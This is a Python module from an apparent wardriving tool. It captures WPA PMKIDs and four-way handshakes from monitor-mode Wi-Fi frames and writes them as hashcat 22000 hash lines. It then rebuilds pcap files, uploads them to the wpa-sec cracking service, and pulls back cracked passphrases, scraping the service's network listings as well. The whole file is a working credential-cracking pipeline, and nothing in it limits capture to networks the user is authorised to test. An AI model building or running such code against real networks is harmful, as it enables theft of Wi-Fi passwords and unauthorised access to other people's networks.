"""PMKID and 4-way handshake capture from monitor-mode frames, hashcat 22000
lines, and wpa-sec.stanev.org uploads. A port of the Android app's
PmkidCapture and WpaSec, so captures from both are identical.

Capture is receive-only: when a client associates, the AP sends EAPOL-Key M1
(sometimes with a PMKID) and the client answers with M2. A PMKID becomes a
WPA*01 line; an M1 paired with its M2 (same replay counter) becomes WPA*02.

wpa-sec takes pcap captures, not hash lines, so uploads rebuild a minimal pcap
that hcxpcapngtool accepts: a beacon carrying the ESSID, the M1 (with the PMKID
KDE for WPA*01) and, for a handshake, the real M2 with its MIC restored.
"""

from __future__ import annotations

import html
import io
import logging
import re
import struct
import threading
import time
from dataclasses import dataclass
from typing import Any, Callable

import requests

log = logging.getLogger("wdgwars.capture")

UPLOAD_URL = "https://wpa-sec.stanev.org/?api&upload"
RESULTS_URL = "https://wpa-sec.stanev.org/?api&dl=1"
KEY_URL = "https://wpa-sec.stanev.org/?get_key"


@dataclass
class Hit:
    kind: int            # 1 = PMKID (WPA*01), 2 = handshake (WPA*02)
    key: str             # PMKID hex, or the handshake MIC hex (unique per capture)
    bssid: str
    sta: str
    ssid: str | None
    channel: int
    rssi: int
    time: float
    hashline: str | None = None

    def line(self) -> str:
        essid = (self.ssid or "").encode("utf-8").hex()
        if self.hashline:
            f = self.hashline.split("*")
            if len(f) > 5 and not f[5] and essid:
                f[5] = essid
                return "*".join(f)
            return self.hashline
        return f"WPA*01*{self.key}*{self.bssid.replace(':', '')}*{self.sta.replace(':', '')}*{essid}***"


def _mac(b: bytes, i: int) -> str:
    return b[i:i + 6].hex(":")


class Capture:
    """Feed every data frame to :meth:`scan`; new hits go to ``on_hit``."""

    def __init__(self, on_hit: Callable[[Hit], None]) -> None:
        self.on_hit = on_hit
        self._lock = threading.Lock()
        self._seen: set[str] = set()
        self._m1: dict[str, tuple[bytes, bytes, float]] = {}
        self.eapol = 0
        self.msgs = [0, 0, 0, 0, 0]
        self.pmkids = 0
        self.handshakes = 0

    def scan(self, f: bytes, ch: int, rssi: int, ssid_for: Callable[[str], str | None]) -> None:
        if len(f) < 32 or ((f[0] >> 2) & 3) != 2:
            return
        # LLC/SNAP + EAPOL ethertype, searched past the header so QoS/HT control don't matter
        p = -1
        for q in range(24, min(len(f) - 8, 40) + 1):
            if f[q] == 0xAA and f[q + 1] == 0xAA and f[q + 2] == 0x03 and f[q + 6] == 0x88 and f[q + 7] == 0x8E:
                p = q
                break
        if p < 0:
            return
        e = p + 8
        if e + 7 > len(f) or f[e + 1] != 3:          # EAPOL-Key only
            return
        info = (f[e + 5] << 8) | f[e + 6]
        ack, mic, install, secure = info & 0x80, info & 0x100, info & 0x40, info & 0x200
        if ack and not mic:
            m = 1
        elif mic and not ack and not secure and not install:
            m = 2
        elif mic and ack and install:
            m = 3
        elif mic and secure and not ack:
            m = 4
        else:
            m = 0
        from_ds = (f[1] >> 1) & 1
        ap = _mac(f, 10 if from_ds else 4)
        sta = _mac(f, 4 if from_ds else 10)
        pair = f"{ap}|{sta}"
        now = time.time()
        with self._lock:
            self.eapol += 1
            if m:
                self.msgs[m] += 1
            if m == 1 and e + 49 <= len(f):
                if len(self._m1) > 256:
                    self._m1 = {k: v for k, v in self._m1.items() if now - v[2] < 30}
                self._m1[pair] = (f[e + 17:e + 49], f[e + 9:e + 17], now)
            if m == 2 and e + 99 <= len(f):
                body = (f[e + 2] << 8) | f[e + 3]
                flen = 4 + body
                m1 = self._m1.get(pair)
                if m1 and m1[1] == f[e + 9:e + 17] and e + flen <= len(f):
                    mic_hex = f[e + 81:e + 97].hex()
                    if mic_hex != "0" * 32 and ("hs:" + mic_hex) not in self._seen:
                        self._seen.add("hs:" + mic_hex)
                        fr = bytearray(f[e:e + flen])
                        fr[81:97] = bytes(16)
                        ssid = ssid_for(ap)
                        essid = (ssid or "").encode("utf-8").hex()
                        line = (f"WPA*02*{mic_hex}*{ap.replace(':', '')}*{sta.replace(':', '')}*{essid}*"
                                f"{m1[0].hex()}*{bytes(fr).hex()}*00")
                        self._m1.pop(pair, None)
                        self.handshakes += 1
                        self.on_hit(Hit(2, mic_hex, ap, sta, ssid, ch, rssi, now, line))
            # PMKID KDE in M1 key data: DD 14 00 0F AC 04 <16 bytes>
            i, limit = e, len(f) - 22
            while i <= limit:
                if f[i] == 0xDD and f[i + 1] == 0x14 and f[i + 2:i + 6] == b"\x00\x0f\xac\x04":
                    pm = f[i + 6:i + 22]
                    if any(pm) and pm.hex() not in self._seen:
                        self._seen.add(pm.hex())
                        self.pmkids += 1
                        self.on_hit(Hit(1, pm.hex(), ap, sta, ssid_for(ap), ch, rssi, now))
                    return
                i += 1

    def diag(self) -> dict[str, Any]:
        return {"eapol": self.eapol, "m1": self.msgs[1], "m2": self.msgs[2], "m3": self.msgs[3],
                "m4": self.msgs[4], "pmkids": self.pmkids, "handshakes": self.handshakes}


# --- wpa-sec ------------------------------------------------------------------
def _clean_key(key: str) -> str:
    return "".join(key.split())


def _data_frame(to_ds: bool, a1: bytes, a2: bytes, a3: bytes, eapol: bytes) -> bytes:
    return (bytes([0x08, 0x01 if to_ds else 0x02, 0, 0]) + a1 + a2 + a3 + b"\x00\x00"
            + b"\xaa\xaa\x03\x00\x00\x00\x88\x8e" + eapol)


def _beacon(bssid: bytes, essid: str, ch: int) -> bytes:
    s = essid.encode("utf-8")[:32]
    return (b"\x80\x00\x00\x00" + b"\xff" * 6 + bssid + bssid + b"\x00\x00" + bytes(8) + b"\x64\x00\x11\x04"
            + bytes([0, len(s)]) + s + bytes([1, 8, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
            + bytes([3, 1, ch if 1 <= ch <= 255 else 1])
            + bytes([0x30, 0x14, 1, 0, 0, 0x0F, 0xAC, 4, 1, 0, 0, 0x0F, 0xAC, 4, 1, 0, 0, 0x0F, 0xAC, 2, 0, 0]))


def _m1(ap: bytes, sta: bytes, anonce: bytes, replay: bytes, kde: bytes) -> bytes:
    body = (b"\x02\x00\x8a\x00\x10" + replay.ljust(8, b"\x00")[:8] + anonce.ljust(32, b"\x00")[:32]
            + bytes(16 + 8 + 8 + 16) + struct.pack(">H", len(kde)) + kde)
    eapol = b"\x02\x03" + struct.pack(">H", len(body)) + body
    return _data_frame(False, sta, ap, ap, eapol)


def build_pcap(hits: list[dict[str, Any]]) -> bytes:
    """Classic pcap (802.11, linktype 105) rebuilt from stored captures."""
    out = io.BytesIO()
    out.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 105))
    usec = 0
    beaconed: set[str] = set()

    def rec(ts: int, frame: bytes) -> None:
        nonlocal usec
        out.write(struct.pack("<IIII", ts, usec, len(frame), len(frame)))
        out.write(frame)
        usec += 100

    for h in hits:
        try:
            ts = int(h["time"])
            if h.get("hashline"):
                f = h["hashline"].split("*")
                mic, ap, sta = bytes.fromhex(f[2]), bytes.fromhex(f[3]), bytes.fromhex(f[4])
                essid = bytes.fromhex(f[5]).decode("utf-8", "replace") or (h.get("ssid") or "")
                anonce, m2 = bytes.fromhex(f[6]), bytearray(bytes.fromhex(f[7]))
                if len(m2) >= 97 and len(mic) == 16:
                    m2[81:97] = mic
                replay = bytes(m2[9:17]) if len(m2) >= 17 else bytes(7) + b"\x01"
                kde = b""
            else:
                ap, sta = bytes.fromhex(h["bssid"].replace(":", "")), bytes.fromhex(h["sta"].replace(":", ""))
                essid = h.get("ssid") or ""
                anonce, replay, m2 = bytes(32), bytes(7) + b"\x01", None
                kde = b"\xdd\x14\x00\x0f\xac\x04" + bytes.fromhex(h["key"])
            if essid and ap.hex() not in beaconed:
                beaconed.add(ap.hex())
                rec(ts, _beacon(ap, essid, int(h.get("channel") or 1)))
            rec(ts, _m1(ap, sta, anonce, replay, kde))
            if m2 is not None:
                rec(ts, _data_frame(True, ap, sta, ap, bytes(m2)))
        except (KeyError, ValueError, IndexError):
            continue
    return out.getvalue()


def wpasec_upload(key: str, hits: list[dict[str, Any]], timeout: float = 60.0) -> tuple[bool, str]:
    key = _clean_key(key)
    if not key:
        return False, "no wpa-sec key"
    pcap = build_pcap(hits)
    if len(pcap) <= 24:
        return True, "nothing to upload"
    name = time.strftime("wardrive-%Y%m%d-%H%M%S.pcap")
    try:
        resp = requests.post(UPLOAD_URL, headers={"Cookie": f"key={key}"}, timeout=timeout,
                             files={"file": (name, pcap, "application/vnd.tcpdump.pcap")})
    except requests.RequestException as e:
        return False, f"wpa-sec upload failed: {e}"
    if resp.status_code in (401, 403):
        return False, f"wpa-sec rejected the key (HTTP {resp.status_code})"
    if not 200 <= resp.status_code < 300:
        return False, f"wpa-sec HTTP {resp.status_code}"
    return True, (resp.text.strip().splitlines() or ["uploaded"])[0][:200]


def wpasec_results(key: str, known: dict[str, str], timeout: float = 60.0,
                   names: dict[str, str] | None = None) -> dict[str, str] | None:
    """Cracked networks from the account potfile: {bssid: psk}, for every capture
    on the account (this PC's and the phone's). Lines are ``bssid:sta:essid:psk``;
    with the ESSID known, the exact prefix is stripped so a key containing ':'
    survives. ``names`` (when given) is filled with {bssid: essid}."""
    key = _clean_key(key)
    if not key:
        return None
    try:
        resp = requests.get(RESULTS_URL, headers={"Cookie": f"key={key}"}, timeout=timeout)
    except requests.RequestException:
        return None
    if not 200 <= resp.status_code < 300:
        return None
    out: dict[str, str] = {}
    for line in resp.text.splitlines():
        line = line.strip()
        parts = line.split(":")
        if not line or line.startswith("#") or len(parts) < 4:
            continue
        b = "".join(c for c in parts[0].lower() if c.isalnum())
        if len(b) != 12:
            continue
        essid = known.get(b)
        prefix = f"{parts[0]}:{parts[1]}:{essid}:" if essid is not None else None
        psk = line[len(prefix):] if prefix and line.startswith(prefix) and len(line) > len(prefix) else parts[-1]
        if psk:
            mac = ":".join(b[i:i + 2] for i in range(0, 12, 2))
            out[mac] = psk
            if names is not None:
                names[mac] = essid if essid else ":".join(parts[2:-1])
    return out


MY_NETS_URL = "https://wpa-sec.stanev.org/?my_nets"
_ROW = re.compile(r'<td class="bssid">([0-9a-fA-F]{12})</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td>'
                  r'<td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td>', re.S)
_PAGES = re.compile(r"""<div class=['"]pagination['"]>(.*?)</div>""", re.S)
_HREF = re.compile(r"""href=['"]([^'"]*my_nets[^'"]*)['"]""")


def _text(cell: str) -> str:
    return html.unescape(re.sub(r"<[^>]*>", "", cell)).strip()


def wpasec_my_nets(key: str, timeout: float = 60.0, max_pages: int = 60) -> list[dict[str, Any]] | None:
    """Every network wpa-sec holds for this key (its "My networks" pages, a port of
    Wardrive Go's WpaSec.fetchMyNets): type, features, whether it is cracked, the
    dictionary work done on it and when it arrived. None when the page can't be read."""
    key = _clean_key(key)
    if not key:
        return None
    s = requests.Session()
    s.headers["Cookie"] = f"key={key}"
    out: dict[str, dict[str, Any]] = {}
    todo, done = [MY_NETS_URL], set()
    while todo and len(done) < max_pages:
        url = todo.pop(0)
        done.add(url)
        try:
            resp = s.get(url, timeout=timeout)
        except requests.RequestException:
            return None if not out else list(out.values())
        if resp.status_code != 200:
            return None if not out else list(out.values())
        page = resp.text
        for g in _ROW.findall(page):
            b = g[0].lower()
            mac = ":".join(b[i:i + 2] for i in range(0, 12, 2))
            key_cell = g[4]
            out[mac] = {"bssid": mac, "ssid": _text(g[1]), "type": _text(g[2]), "feat": _text(g[3]),
                        "cracked": "<input" not in key_cell and bool(_text(key_cell)),
                        "psk": "" if "<input" in key_cell else _text(key_cell),
                        "info": _text(g[5]), "works": _text(g[6]), "ts": _text(g[7])}
        m = _PAGES.search(page)
        for href in (_HREF.findall(m.group(1)) if m else []):
            full = href if href.startswith("http") else "https://wpa-sec.stanev.org/" + href.lstrip("/")
            full = html.unescape(full)
            if full not in done and full not in todo:
                todo.append(full)
    return list(out.values())
